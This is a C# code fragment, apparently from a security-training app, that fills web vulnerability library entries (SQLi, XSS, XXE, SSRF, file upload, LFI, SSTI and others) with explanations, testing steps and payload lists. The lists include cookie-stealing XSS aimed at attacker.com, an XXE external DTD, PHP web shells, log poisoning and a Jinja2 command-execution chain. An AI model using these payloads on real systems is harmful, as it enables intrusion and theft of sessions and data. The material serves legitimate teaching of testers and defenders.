                Content = "SQL Injection (SQLi) is one of the most dangerous and impactful web vulnerabilities. It allows attackers to interfere with database queries, potentially accessing, modifying, or deleting data. It consistently appears in the OWASP Top 10.\n\nHow SQL Injection Works: Applications build SQL queries using user-supplied input without proper sanitization. When special characters like single quotes are interpreted as SQL syntax rather than data, an attacker can manipulate the query.\n\nTypes of SQL Injection:\nIn-band SQLi: Results returned in the same channel. Error-based extracts data from error messages. Union-based uses UNION SELECT to append additional query.\nBlind SQLi: No visible output. Boolean-based infers data from true/false responses. Time-based uses database delays.\nOut-of-band SQLi: Uses different channel (DNS, HTTP requests) to extract data. Used when in-band and blind are not possible.\n\nWhat an Attacker Can Do: Extract all data from the database (usernames, passwords, PII, financial data), modify or delete data, bypass authentication, read/write files on the server, execute OS commands (in some configurations).\n\nCommon Vulnerable Parameters: URL parameters (?id=1), form fields, search boxes, login forms, cookie values, HTTP headers.\n\nPrevention: Parameterized queries/prepared statements, stored procedures (properly), input validation, Web Application Firewall.",
                Commands = new List<CommandItem>
                {
                    new CommandItem { Text = "' OR 1=1 --", Explanation = "Classic SQLi test. If login is bypassed or error appears, injection may exist." },
                    new CommandItem { Text = "' OR '1'='1", Explanation = "Alternative bypass without comment. Tests string-based injection." },
                    new CommandItem { Text = "1 AND 1=1", Explanation = "Boolean true test for numeric injection points." },
                    new CommandItem { Text = "1 AND 1=2", Explanation = "Boolean false test. If response differs from AND 1=1, injection exists." },
                    new CommandItem { Text = "1 AND SLEEP(5)", Explanation = "Time-based injection test. If page delays 5 seconds, time-based injection exists." },
                    new CommandItem { Text = "1 UNION SELECT NULL,NULL,NULL--", Explanation = "Union-based test. Vary NULL count to match number of columns." },
                    new CommandItem { Text = "1 ORDER BY 5--", Explanation = "Determine number of columns. Increase number until error to find column count." },
                    new CommandItem { Text = "sqlmap -u 'https://target.com/page?id=1' --dbs", Explanation = "Automated SQL injection detection and exploitation." }
                },
                Steps = new List<StepItem>
                {
                    new StepItem { Number = 1, Description = "Identify input points that interact with database", Code = "URL params, search forms, login, registration" },
                    new StepItem { Number = 2, Description = "Test for basic SQL injection", Code = "Add single quote (') and observe response" },
                    new StepItem { Number = 3, Description = "Identify injection type based on response", Code = "Error? error-based. Behavior change? boolean. Delay? time-based" },
                    new StepItem { Number = 4, Description = "Determine number of columns for UNION", Code = "ORDER BY 1, ORDER BY 2 until error" },
                    new StepItem { Number = 5, Description = "Confirm database and version", Code = "UNION SELECT @@version--" },
                    new StepItem { Number = 6, Description = "Extract database contents", Code = "sqlmap -r request.txt -D targetdb -T users --dump" },
                    new StepItem { Number = 7, Description = "Document impact and write report", Code = "Include extracted data as evidence" }
                },
                Tools = new List<string> { "SQLMap", "Burp Suite", "Manual testing", "Havij" },
                Resources = new List<string>
                {
                    "https://portswigger.net/web-security/sql-injection",
                    "https://owasp.org/www-community/attacks/SQL_Injection",
                    "https://github.com/sqlmapproject/sqlmap/wiki/Usage",
                    "https://www.w3schools.com/sql/sql_injection.asp"
                }
            };

            libraryTopics["Vuln_XSS"] = new LibraryTopic
            {
                Tag = "Vuln_XSS",
                Category = "Vulnerabilities",
                Title = "Cross-Site Scripting (XSS) Mastery",
                Subtitle = "Finding, Exploiting, and Reporting XSS",
                Content = "Cross-Site Scripting (XSS) is one of the most prevalent web vulnerabilities. It allows attackers to inject malicious scripts into pages viewed by other users. XSS can lead to session hijacking, credential theft, defacement, and malware distribution.\n\nTypes of XSS:\nReflected XSS: Malicious script is reflected off the web server in a response. The user must be tricked into clicking a crafted link. Non-persistent.\nStored XSS: Malicious script is permanently stored on the target server (database, forum post, comment). All users viewing the affected page execute the script. Most dangerous type.\nDOM-based XSS: Occurs entirely in the browser. The vulnerability is in client-side JavaScript that processes attacker-controlled data and writes it to the DOM without sanitization.\n\nXSS Impact: Session cookie theft (if HttpOnly not set), keylogging, phishing overlays, cryptocurrency mining, credential harvesting, CSRF attacks, defacement.\n\nFinding XSS: Test all input fields, URL parameters, headers, and any place where user data appears in the response. Use specific payloads to detect filtering.\n\nXSS Prevention: Context-aware output encoding, Content Security Policy (CSP), HttpOnly and Secure cookie flags, input validation.",
                Commands = new List<CommandItem>
                {
                    new CommandItem { Text = "<script>alert(1)</script>", Explanation = "Basic XSS test payload. If alert box appears, XSS exists." },
                    new CommandItem { Text = "<img src=x onerror=alert(1)>", Explanation = "Image tag XSS. Fires when image fails to load. Bypasses some filters." },
                    new CommandItem { Text = "<svg onload=alert(1)>", Explanation = "SVG-based XSS. Works in many contexts where script tags are blocked." },
                    new CommandItem { Text = "javascript:alert(1)", Explanation = "JavaScript URI. Test in href attributes and similar contexts." },
                    new CommandItem { Text = "<iframe src=javascript:alert(1)>", Explanation = "Iframe with JavaScript URI." },
                    new CommandItem { Text = "\"><script>alert(1)</script>", Explanation = "Break out of attribute context first with quote and angle bracket." },
                    new CommandItem { Text = "';alert(1)//", Explanation = "Break out of JavaScript string context." },
                    new CommandItem { Text = "<script>fetch('https://attacker.com/?c='+document.cookie)</script>", Explanation = "Cookie stealing payload. Sends victim's cookies to attacker server." },
                    new CommandItem { Text = "<script>document.location='https://attacker.com/?c='+document.cookie</script>", Explanation = "Alternative cookie exfiltration via redirect." },
                    new CommandItem { Text = "{{7*7}}", Explanation = "Template injection test. If 49 appears, may be SSTI not XSS." },
                    new CommandItem { Text = "<ScRiPt>alert(1)</ScRiPt>", Explanation = "Mixed case to bypass case-sensitive filters." },
                    new CommandItem { Text = "<script>alert(String.fromCharCode(88,83,83))</script>", Explanation = "Char code encoding to bypass keyword filters." }
                },
                Steps = new List<StepItem>
                {
                    new StepItem { Number = 1, Description = "Map all input points where user data appears in responses", Code = "Search fields, comments, profiles, URL params" },
                    new StepItem { Number = 2, Description = "Test with basic payload", Code = "<script>alert(1)</script>" },
                    new StepItem { Number = 3, Description = "Check where input is reflected in response", Code = "View source to see how input is placed in HTML" },
                    new StepItem { Number = 4, Description = "Craft context-appropriate payload", Code = "HTML context, attribute context, JavaScript context" },
                    new StepItem { Number = 5, Description = "Bypass any filters", Code = "Encoding, case variation, alternative tags" },
                    new StepItem { Number = 6, Description = "Create proof of concept", Code = "Use alert() or prompt() to show execution" },
                    new StepItem { Number = 7, Description = "Assess impact and write report", Code = "Include POC URL and screenshots" }
                },
                Tools = new List<string> { "Burp Suite", "XSStrike", "DalFox", "XSS Hunter", "BeEF" },
                Resources = new List<string>
                {
                    "https://portswigger.net/web-security/cross-site-scripting",
                    "https://owasp.org/www-community/attacks/xss/",
                    "https://github.com/s0md3v/XSStrike",
                    "https://xsshunter.com/"
                }
            };

            libraryTopics["Vuln_Auth"] = new LibraryTopic
            {
                Tag = "Vuln_Auth",
                Category = "Vulnerabilities",
                Title = "Broken Authentication Deep Dive",
                Subtitle = "Finding and Exploiting Authentication Weaknesses",
                Content = "Broken authentication encompasses a range of vulnerabilities that allow attackers to bypass login mechanisms, take over accounts, or gain unauthorized access. It's a persistent top-10 OWASP vulnerability.\n\nCommon Authentication Flaws:\n1. Weak credentials - Default or easily guessable passwords\n2. No account lockout - Allows brute force attacks\n3. Insecure session tokens - Predictable, short, or reused tokens\n4. Session not invalidated on logout - Old sessions remain valid\n5. Credential exposure in URLs - Passwords in query strings logged\n6. No MFA - Single factor authentication only\n7. Password reset flaws - Weak reset mechanisms\n8. Remember me vulnerabilities - Insecure persistent login tokens\n\nPassword Reset Testing: Many authentication bypasses are found in password reset flows. Test for: token predictability, token expiry (does it expire?), token reuse, host header injection in reset emails.\n\nSession Management: Session tokens must be cryptographically random, sufficiently long, regenerated after login, and invalidated on logout. Test each of these properties.\n\nMFA Bypass: Test if MFA can be skipped by directly accessing post-login pages, if backup codes are weak, if the MFA code is sent in the response, or if there's a race condition.",
                Commands = new List<CommandItem>
                {
                    new CommandItem { Text = "hydra -l admin -P wordlist.txt target.com http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'", Explanation = "Brute force login form." },
                    new CommandItem { Text = "curl -c cookies.txt -b cookies.txt 'https://target.com/logout'", Explanation = "Test if logout actually invalidates session." },
                    new CommandItem { Text = "curl -H 'Host: evil.com' 'https://target.com/reset-password'", Explanation = "Host header injection in password reset. May send reset link to attacker domain." },
                    new CommandItem { Text = "curl 'https://target.com/dashboard' --cookie 'session=OLDTOKEN'", Explanation = "Test if old session token still works after logout." },
                    new CommandItem { Text = "ffuf -u 'https://target.com/reset?token=FUZZ' -w tokens.txt", Explanation = "Brute force password reset tokens if they're short or predictable." }
                },
                Steps = new List<StepItem>
                {
                    new StepItem { Number = 1, Description = "Test login for account lockout", Code = "Send 10+ failed attempts and check if locked" },
                    new StepItem { Number = 2, Description = "Test password reset flow", Code = "Check token length, expiry, and reusability" },
                    new StepItem { Number = 3, Description = "Test host header injection in password reset", Code = "curl -H 'Host: evil.com' /reset-password" },
                    new StepItem { Number = 4, Description = "Test session invalidation on logout", Code = "Capture token before logout, use after" },
                    new StepItem { Number = 5, Description = "Test for MFA bypass", Code = "Try accessing post-login pages directly without completing MFA" }
                },
                Tools = new List<string> { "Burp Suite", "Hydra", "ffuf", "Autorize" },
                Resources = new List<string>
                {
                    "https://portswigger.net/web-security/authentication",
                    "https://owasp.org/www-project-top-ten/2017/A2_2017-Broken_Authentication"
                }
            };

            libraryTopics["Vuln_Data"] = new LibraryTopic
            {
                Tag = "Vuln_Data",
                Category = "Vulnerabilities",
                Title = "Sensitive Data Exposure Guide",
                Subtitle = "Finding Exposed Sensitive Information",
                Content = "Sensitive data exposure occurs when applications inadvertently expose sensitive information such as passwords, credit card numbers, health records, personal data, or business secrets. This can happen through insecure transmission, insecure storage, or information leakage.\n\nTypes of Sensitive Data Exposure:\n1. Credentials in source code or repositories\n2. API keys in JavaScript files\n3. Sensitive data in HTTP responses\n4. Stack traces with internal information\n5. Backup files with sensitive content\n6. Directory listing with sensitive files\n7. Internal paths revealed in error messages\n8. Sensitive data in cookies without encryption\n9. Data in URL parameters (logged by servers)\n10. Cache poisoning of sensitive data\n\nWhere to Look: JavaScript files often contain API keys and endpoints. Git repositories may have committed secrets. Error pages may reveal technology stack and paths. Robots.txt may list sensitive directories. HTTP headers may reveal internal IPs and versions.\n\nTools for Finding Secrets: truffleHog scans git repos for secrets. gitleaks finds exposed secrets. LinkFinder extracts endpoints from JS files. SecretFinder finds API keys in JS files.",
                Commands = new List<CommandItem>
                {
                    new CommandItem { Text = "curl https://target.com/robots.txt", Explanation = "Check robots.txt for hidden directories and sensitive paths." },
                    new CommandItem { Text = "curl https://target.com/.git/config", Explanation = "Check if .git directory is exposed. Can reveal repository info." },
                    new CommandItem { Text = "gitleaks detect --source=. -v", Explanation = "Scan current directory for exposed secrets in git history." },
                    new CommandItem { Text = "trufflehog git https://github.com/target/repo", Explanation = "Deep scan git repo for secrets in all commits." },
                    new CommandItem { Text = "python3 LinkFinder.py -i https://target.com/app.js -o cli", Explanation = "Extract endpoints and sensitive data from JavaScript files." },
                    new CommandItem { Text = "curl -I https://target.com | grep -i 'server\\|x-powered\\|version'", Explanation = "Check headers for version information." },
                    new CommandItem { Text = "ffuf -u https://target.com/FUZZ -w backup_extensions.txt", Explanation = "Search for backup files (.bak, .old, .backup, ~)." }
                },
                Steps = new List<StepItem>
                {
                    new StepItem { Number = 1, Description = "Review all JavaScript files for secrets", Code = "LinkFinder, SecretFinder, manual review" },
                    new StepItem { Number = 2, Description = "Check for exposed git repositories", Code = "curl https://target.com/.git/HEAD" },
                    new StepItem { Number = 3, Description = "Test for directory listing", Code = "Visit directories directly in browser" },
                    new StepItem { Number = 4, Description = "Search for backup files", Code = "ffuf with backup wordlist" },
                    new StepItem { Number = 5, Description = "Review error messages for info disclosure", Code = "Trigger errors intentionally to see stack traces" }
                },
                Tools = new List<string> { "gitleaks", "truffleHog", "LinkFinder", "SecretFinder", "gitrob", "Burp Suite" }
            };

            libraryTopics["Vuln_XXE"] = new LibraryTopic
            {
                Tag = "Vuln_XXE",
                Category = "Vulnerabilities",
                Title = "XXE Injection Complete Tutorial",
                Subtitle = "XML External Entity Injection Attacks",
                Content = "XXE (XML External Entity) injection is a vulnerability in applications that parse XML input. When XML parsers are configured to process external entity references, attackers can use XXE to read local files, perform SSRF, or even execute code.\n\nHow XXE Works: XML supports 'entities' which are variables that can be defined and referenced. External entities can reference resources outside the XML document, including local files or remote URLs. If the parser resolves these references and returns the content, information disclosure or SSRF occurs.\n\nXXE Impact: Read arbitrary files from the server (/etc/passwd, application configs, source code), SSRF to internal services, blind SSRF for scanning internal network, DoS via entity expansion (Billion Laughs attack), remote code execution in some configurations.\n\nFinding XXE: Look for applications that accept XML input (SOAP web services, file uploads accepting XML/SVG/DOCX, REST APIs with XML content type, RSS/Atom feeds).\n\nXXE Prevention: Disable external entity processing in XML parsers. Use less complex data formats (JSON). Whitelist allowed XML inputs. Update XML libraries regularly.",
                Commands = new List<CommandItem>
                {
                    new CommandItem { Text = "<?xml version=\"1.0\"?><!DOCTYPE test [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><test>&xxe;</test>", Explanation = "Basic XXE payload to read /etc/passwd file." },
                    new CommandItem { Text = "<?xml version=\"1.0\"?><!DOCTYPE test [<!ENTITY xxe SYSTEM \"http://attacker.com/\">]><test>&xxe;</test>", Explanation = "SSRF via XXE. Make server request external URL." },
                    new CommandItem { Text = "<?xml version=\"1.0\"?><!DOCTYPE test [<!ENTITY xxe SYSTEM \"file:///etc/hosts\">]><test>&xxe;</test>", Explanation = "Read /etc/hosts to discover internal hostnames." },
                    new CommandItem { Text = "<?xml version=\"1.0\"?><!DOCTYPE test SYSTEM \"http://attacker.com/evil.dtd\"><test>&exfil;</test>", Explanation = "Blind XXE using external DTD file hosted on attacker server." },
                    new CommandItem { Text = "Content-Type: application/xml", Explanation = "Change content type to XML and test if the endpoint processes XML." }
                },
                Steps = new List<StepItem>
                {
                    new StepItem { Number = 1, Description = "Find XML input points", Code = "SOAP APIs, file upload, XML content-type endpoints" },
                    new StepItem { Number = 2, Description = "Test basic XXE payload", Code = "Inject DOCTYPE with SYSTEM entity" },
                    new StepItem { Number = 3, Description = "Try reading /etc/passwd", Code = "file:///etc/passwd entity" },
                    new StepItem { Number = 4, Description = "Test for blind XXE with out-of-band", Code = "Use Burp Collaborator for detection" },
                    new StepItem { Number = 5, Description = "Try SSRF via XXE", Code = "http://169.254.169.254/ for cloud metadata" }
                },
                Tools = new List<string> { "Burp Suite", "Burp Collaborator", "XXEinjector" }
            };

            libraryTopics["Vuln_IDOR"] = new LibraryTopic
            {
                Tag = "Vuln_IDOR",
                Category = "Vulnerabilities",
                Title = "IDOR - Insecure Direct Object References",
                Subtitle = "Finding and Exploiting Access Control Flaws",
                Content = "IDOR (Insecure Direct Object Reference) occurs when an application uses user-controllable input to access objects directly without proper authorization checks. If a user can access resources belonging to other users by manipulating an identifier, an IDOR vulnerability exists.\n\nHow IDOR Works: An application assigns IDs to resources (user profiles, orders, invoices, messages). If the application doesn't verify that the requesting user is authorized to access the resource with a given ID, any user can access any resource by guessing or incrementing the ID.\n\nIDOR Types:\nHorizontal IDOR: Accessing resources of other users at the same privilege level (user A accesses user B's data)\nVertical IDOR: Accessing resources at a higher privilege level (regular user accesses admin functions)\n\nWhere to Find IDOR: URL parameters (?id=123), POST body parameters, API endpoints, cookie values, headers, UUID parameters.\n\nIDOR Impact: Can be critical if it exposes PII, financial data, private messages, or allows account takeover. Severity depends on what data is exposed.\n\nIDOR vs BOLA: BOLA (Broken Object Level Authorization) is the API-focused term for what IDOR represents in APIs.",
                Commands = new List<CommandItem>
                {
                    new CommandItem { Text = "curl 'https://target.com/api/user/123' -H 'Authorization: Bearer YOUROWN_TOKEN'", Explanation = "Test accessing another user's data with your own auth token." },
                    new CommandItem { Text = "curl 'https://target.com/api/orders/999' -H 'Cookie: session=YOURTOKEN'", Explanation = "Try accessing orders that don't belong to you." },
                    new CommandItem { Text = "for i in $(seq 1 100); do curl -s 'https://target.com/api/user/'$i -H 'Authorization: Bearer TOKEN'; done", Explanation = "Iterate through user IDs to test for IDOR." },
                    new CommandItem { Text = "Burp: Send request to Intruder, mark ID as position, use number payload", Explanation = "Burp Intruder for systematic IDOR testing." }
                },
                Steps = new List<StepItem>
                {
                    new StepItem { Number = 1, Description = "Create two test accounts (Account A and Account B)", Code = "Use separate browser profiles or Burp sessions" },
                    new StepItem { Number = 2, Description = "Find all ID parameters with Account A", Code = "Profile IDs, order IDs, message IDs, etc." },
                    new StepItem { Number = 3, Description = "Log in as Account B and access Account A's resources", Code = "Change ID in requests from B's session to A's resource IDs" },
                    new StepItem { Number = 4, Description = "Test all HTTP methods (GET, PUT, DELETE)", Code = "Not just GET - DELETE IDOR is critical" },
                    new StepItem { Number = 5, Description = "Test with GUIDs and hashed IDs too", Code = "UUIDs can still be vulnerable" },
                    new StepItem { Number = 6, Description = "Document impact and write clear report", Code = "Show exactly what data was accessed" }
                },
                Tools = new List<string> { "Burp Suite", "Autorize extension", "curl" }
            };

            libraryTopics["Vuln_CSRF"] = new LibraryTopic
            {
                Tag = "Vuln_CSRF",
                Category = "Vulnerabilities",
                Title = "CSRF - Cross-Site Request Forgery",
                Subtitle = "Complete CSRF Testing and Exploitation Guide",
                Content = "CSRF (Cross-Site Request Forgery) tricks users into performing unintended actions on authenticated web applications. An attacker hosts a malicious page that, when visited by an authenticated victim, makes requests to the target application using the victim's credentials.\n\nHow CSRF Works: Browsers automatically include cookies with cross-origin requests. If a banking application uses only cookie authentication and doesn't verify the request origin, an attacker can embed a form or img tag that makes the victim transfer money without their knowledge.\n\nCSRF Conditions: The application must use cookie-based authentication. There must be an action worth performing (password change, email change, money transfer). The request must be predictable (no CSRF tokens, or tokens that are predictable).\n\nCSRF Defenses: CSRF tokens (random, unique per session), SameSite cookie attribute (Strict or Lax), Origin/Referer header validation, Custom request headers (not sendable cross-origin by simple form).\n\nCSRF Testing: Check if sensitive actions have CSRF tokens. Remove or change the token and see if the action still succeeds. Test if token is tied to session or can be reused across sessions.\n\nCSRF with JSON: JSON POST requests require Content-Type: application/json, which can't be sent cross-origin with simple forms. However, some applications accept both JSON and form data.",
                Commands = new List<CommandItem>
                {
                    new CommandItem { Text = "<form action='https://target.com/change-email' method='POST'><input name='email' value='attacker@evil.com'><input type='submit'></form><script>document.forms[0].submit()</script>", Explanation = "Basic CSRF PoC HTML page. Auto-submits form on load." },
                    new CommandItem { Text = "curl -X POST 'https://target.com/change-password' -d 'newpass=hacked' -H 'Cookie: session=VICTIM_SESSION' --referer 'https://evil.com'", Explanation = "Test CSRF with wrong Referer header to check if Referer is validated." },
                    new CommandItem { Text = "curl -X POST 'https://target.com/change-email' -d 'email=new@test.com&csrf_token=' -H 'Cookie: VICTIM_SESSION'", Explanation = "Test with empty CSRF token to see if validation is enforced." }
                },
                Steps = new List<StepItem>
                {
                    new StepItem { Number = 1, Description = "Identify state-changing actions (password, email, transfers)", Code = "Browse application noting all forms and actions" },
                    new StepItem { Number = 2, Description = "Check if actions have CSRF tokens", Code = "Look for csrf_token, _token, nonce fields" },
                    new StepItem { Number = 3, Description = "Test removing or changing CSRF token", Code = "Repeat request with token removed or modified" },
                    new StepItem { Number = 4, Description = "Check SameSite cookie attribute", Code = "If SameSite=Strict/Lax, CSRF is mitigated" },
                    new StepItem { Number = 5, Description = "Create PoC HTML page", Code = "Auto-submitting form demonstrating the attack" },
                    new StepItem { Number = 6, Description = "Assess impact and write report", Code = "What action can an attacker perform?" }
                },
                Tools = new List<string> { "Burp Suite", "CSRF PoC generator (Burp)", "curl" }
            };

            libraryTopics["Vuln_SSRF"] = new LibraryTopic
            {
                Tag = "Vuln_SSRF",
                Category = "Vulnerabilities",
                Title = "SSRF - Server-Side Request Forgery",
                Subtitle = "Finding and Exploiting SSRF Vulnerabilities",
                Content = "SSRF (Server-Side Request Forgery) allows attackers to induce the server-side application to make requests to an unintended location. This can be used to access internal services, cloud metadata endpoints, and bypass firewall protections.\n\nHow SSRF Works: Applications that fetch remote resources based on user-supplied URLs are vulnerable. By supplying an internal URL or cloud metadata URL, the attacker makes the server request its own internal services on their behalf.\n\nSSRF Impact: Access AWS/GCP/Azure metadata (169.254.169.254), internal services not exposed externally, internal network scanning, bypass firewall restrictions, can chain to RCE in some cases.\n\nCloud Metadata Endpoints:\nAWS: http://169.254.169.254/latest/meta-data/\nGCP: http://metadata.google.internal/computeMetadata/v1/\nAzure: http://169.254.169.254/metadata/instance\nDigitalOcean: http://169.254.169.254/metadata/v1\n\nBlind SSRF: Many SSRF vulnerabilities don't return the response to the attacker. Use Burp Collaborator or interactsh for out-of-band detection.\n\nSSRF Bypass Techniques: Using http://0177.0.0.1/ (octal), http://2130706433/ (decimal), http://127.0.0.1.nip.io, IPv6 localhost (::1), short URLs.",
                Commands = new List<CommandItem>
                {
                    new CommandItem { Text = "curl 'https://target.com/fetch?url=http://169.254.169.254/latest/meta-data/'", Explanation = "Test for SSRF by injecting AWS metadata URL." },
                    new CommandItem { Text = "curl 'https://target.com/fetch?url=http://127.0.0.1:8080/admin'", Explanation = "Access internal admin panel via SSRF." },
                    new CommandItem { Text = "curl 'https://target.com/fetch?url=http://0177.0.0.1/'", Explanation = "Octal encoding of 127.0.0.1 to bypass IP filters." },
                    new CommandItem { Text = "curl 'https://target.com/fetch?url=http://COLLABORATOR_URL'", Explanation = "Detect blind SSRF using Burp Collaborator out-of-band." },
                    new CommandItem { Text = "for port in 80 443 8080 8443 3000 3306 5432; do curl 'https://target.com/fetch?url=http://127.0.0.1:'$port; done", Explanation = "Internal port scanning via SSRF." }
                },
                Steps = new List<StepItem>
                {
                    new StepItem { Number = 1, Description = "Find parameters that make server-side requests", Code = "url=, site=, webhook=, redirect=, fetch=" },
                    new StepItem { Number = 2, Description = "Test with Burp Collaborator URL for blind SSRF", Code = "Replace URL with your collaborator payload" },
                    new StepItem { Number = 3, Description = "Try cloud metadata endpoints", Code = "http://169.254.169.254/latest/meta-data/" },
                    new StepItem { Number = 4, Description = "Try internal service ports", Code = "http://127.0.0.1:3306, http://127.0.0.1:6379" },
                    new StepItem { Number = 5, Description = "Attempt filter bypass techniques", Code = "Decimal, octal, IPv6, DNS rebinding" }
                },
                Tools = new List<string> { "Burp Suite", "Burp Collaborator", "interactsh", "SSRFmap" }
            };

            libraryTopics["Vuln_Upload"] = new LibraryTopic
            {
                Tag = "Vuln_Upload",
                Category = "Vulnerabilities",
                Title = "File Upload Vulnerabilities Guide",
                Subtitle = "Exploiting Insecure File Upload Mechanisms",
                Content = "File upload vulnerabilities occur when web applications allow users to upload files without properly validating and restricting file types, content, and names. This can lead to remote code execution, XSS, SSRF, or directory traversal.\n\nFile Upload Attack Types:\n1. Upload web shell - Upload PHP/ASP file to execute commands\n2. Upload HTML/JS for XSS stored on server\n3. Upload SVG with XSS payload\n4. SSRF via uploading XML/SVG\n5. Path traversal in filename\n6. Zip slip via malicious zip contents\n7. Polyglot files that are valid in multiple formats\n\nBypass Techniques:\nContent-Type bypass: Change MIME type in request\nExtension bypass: double extension (shell.php.jpg), null byte (shell.php%00.jpg), case variation (shell.PHP)\nMagic bytes bypass: Add image magic bytes before PHP code\nContent bypass: Valid image with PHP code appended\n\nFinding Upload Vulnerabilities: Look for file upload features, avatar uploads, document uploads, image uploads, any feature accepting file input.\n\nImpact Assessment: If you can upload a webshell, it's usually critical. SVG XSS or stored XSS via upload is usually medium-high severity.",
                Commands = new List<CommandItem>
                {
                    new CommandItem { Text = "<?php system($_GET['cmd']); ?>", Explanation = "Simple PHP web shell. Upload as .php file to achieve RCE." },
                    new CommandItem { Text = "curl -F 'file=@shell.php' https://target.com/upload", Explanation = "Upload file via curl." },
                    new CommandItem { Text = "exiftool -Comment='<?php system($_GET[\"cmd\"]); ?>' image.jpg -o shell.jpg.php", Explanation = "Embed PHP in EXIF data of image file." },
                    new CommandItem { Text = "<svg xmlns='http://www.w3.org/2000/svg'><script>alert(1)</script></svg>", Explanation = "SVG file with XSS payload. Save as .svg and upload." },
                    new CommandItem { Text = "Content-Type: image/jpeg", Explanation = "Change Content-Type header to bypass MIME type validation." }
                },
                Steps = new List<StepItem>
                {
                    new StepItem { Number = 1, Description = "Find all file upload features", Code = "Profile pictures, documents, imports" },
                    new StepItem { Number = 2, Description = "Understand what file types are allowed", Code = "Try uploading various file types" },
                    new StepItem { Number = 3, Description = "Test extension-based filters", Code = "Try .php, .phtml, .PHP, .php5" },
                    new StepItem { Number = 4, Description = "Test MIME type bypass", Code = "Change Content-Type to image/jpeg while keeping .php extension" },
                    new StepItem { Number = 5, Description = "Upload SVG with XSS if images allowed", Code = "SVG with script tag" },
                    new StepItem { Number = 6, Description = "Find where uploaded files are stored", Code = "Access the uploaded file via URL" }
                },
                Tools = new List<string> { "Burp Suite", "weevely", "exiftool", "Upload Scanner (Burp extension)" }
            };

            libraryTopics["Vuln_LFI"] = new LibraryTopic
            {
                Tag = "Vuln_LFI",
                Category = "Vulnerabilities",
                Title = "LFI and RFI Complete Guide",
                Subtitle = "Local and Remote File Inclusion Attacks",
                Content = "LFI (Local File Inclusion) allows attackers to include files that are already on the server. RFI (Remote File Inclusion) allows including files from remote URLs. Both can lead to sensitive file disclosure and potentially RCE.\n\nHow LFI Works: Applications that dynamically include files based on user input (like ?page=home.php) may allow attackers to traverse the file system and include arbitrary files.\n\nLFI Impact: Read /etc/passwd (user list), read application config files (database credentials), read SSH private keys, read web server configs, log poisoning to achieve RCE.\n\nPath Traversal: ../../etc/passwd uses ../ to traverse up directories. The number of ../ needed depends on the starting directory.\n\nLFI to RCE: Log poisoning - inject PHP code into server logs (access.log, auth.log, mail.log), then include the log file. Proc self environ - include PHP code in User-Agent, then access /proc/self/environ. PHP wrappers like php://filter, php://input can also enable RCE.\n\nRFI: If include() accepts remote URLs (allow_url_include=On in PHP config), attackers can include a remote PHP file with malicious code.\n\nFilter Bypasses: Null byte (%00), path traversal variants (....//), encoding tricks.",
                Commands = new List<CommandItem>
                {
                    new CommandItem { Text = "curl 'https://target.com/?page=../../../../etc/passwd'", Explanation = "Basic LFI test to read /etc/passwd." },
                    new CommandItem { Text = "curl 'https://target.com/?page=....//....//....//etc/passwd'", Explanation = "Double-dot bypass variation." },
                    new CommandItem { Text = "curl 'https://target.com/?page=php://filter/convert.base64-encode/resource=index.php'", Explanation = "PHP filter wrapper to read PHP source code as base64." },
                    new CommandItem { Text = "curl 'https://target.com/?page=/var/log/apache2/access.log'", Explanation = "Try to include Apache log file for log poisoning." },
                    new CommandItem { Text = "curl 'https://target.com/' -A '<?php system($_GET[\"cmd\"]); ?>'", Explanation = "Inject PHP code into User-Agent for log poisoning." },
                    new CommandItem { Text = "curl 'https://target.com/?page=php://input' -d '<?php system(\"id\"); ?>'", Explanation = "PHP input wrapper for RCE if allow_url_include is on." }
                },
                Steps = new List<StepItem>
                {
                    new StepItem { Number = 1, Description = "Find parameters that include files", Code = "page=, file=, template=, include=" },
                    new StepItem { Number = 2, Description = "Test basic path traversal", Code = "../../../../etc/passwd" },
                    new StepItem { Number = 3, Description = "Test PHP wrappers", Code = "php://filter/convert.base64-encode/resource=" },
                    new StepItem { Number = 4, Description = "Try to read sensitive files", Code = "/etc/shadow, config.php, .env" },
                    new StepItem { Number = 5, Description = "Test for log poisoning to RCE", Code = "Inject PHP in User-Agent then include log file" }
                },
                Tools = new List<string> { "Burp Suite", "LFISuite", "Kadimus", "fimap" }
            };

            libraryTopics["Vuln_SSTI"] = new LibraryTopic
            {
                Tag = "Vuln_SSTI",
                Category = "Vulnerabilities",
                Title = "SSTI - Server-Side Template Injection",
                Subtitle = "Exploiting Template Engine Vulnerabilities",
                Content = "Server-Side Template Injection (SSTI) occurs when user input is embedded in a template unsafely. Template engines (Jinja2, Twig, Freemarker, Velocity, etc.) are designed to generate dynamic content. If user input is treated as template code rather than data, attackers can execute arbitrary code.\n\nTemplate Engines by Language:\nPython: Jinja2 (Flask), Mako, Tornado\nJava: Freemarker, Velocity, Pebble, Thymeleaf\nPHP: Twig, Smarty, Blade\nRuby: ERB, Liquid, Haml\nJavaScript: Jade/Pug, EJS, Handlebars\n\nDetection: Inject template syntax and observe if it's evaluated. Jinja2: {{7*7}} → 49. Twig: {{7*'7'}} → 7777777. Freemarker: ${7*7} → 49.\n\nExploitation Path: From template injection to RCE. In Jinja2, access config objects, class attributes, and eventually os.system or subprocess.\n\nImpact: SSTI typically leads to RCE, making it a critical vulnerability. It's often found in email templates, search results, error messages, and any place user input is reflected through a template.",
                Commands = new List<CommandItem>
                {
                    new CommandItem { Text = "{{7*7}}", Explanation = "Basic SSTI detection for Jinja2, Twig, and others. If 49 appears, injection works." },
                    new CommandItem { Text = "${7*7}", Explanation = "Freemarker and EL injection test. If 49 appears, potential SSTI." },
                    new CommandItem { Text = "{{config}}", Explanation = "Jinja2 - dump Flask config object. May contain SECRET_KEY." },
                    new CommandItem { Text = "{{''.__class__.__mro__[2].__subclasses__()}}", Explanation = "Jinja2 - access Python class hierarchy to find useful classes." },
                    new CommandItem { Text = "{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}", Explanation = "Jinja2 RCE - execute OS command and read output." },
                    new CommandItem { Text = "{{'a'.toUpperCase()}}", Explanation = "Smarty/Twig - test string method execution." }
                },
                Steps = new List<StepItem>
                {
                    new StepItem { Number = 1, Description = "Find input that appears in application output", Code = "Username, search, profile fields" },
                    new StepItem { Number = 2, Description = "Test basic template math", Code = "{{7*7}}, ${7*7}, #{7*7}" },
                    new StepItem { Number = 3, Description = "Identify the template engine", Code = "Different engines have different syntax" },
                    new StepItem { Number = 4, Description = "Use engine-specific payloads for RCE", Code = "Jinja2 Python execution chain" },
                    new StepItem { Number = 5, Description = "Execute id or whoami to confirm RCE", Code = "Document output as proof" }
                },
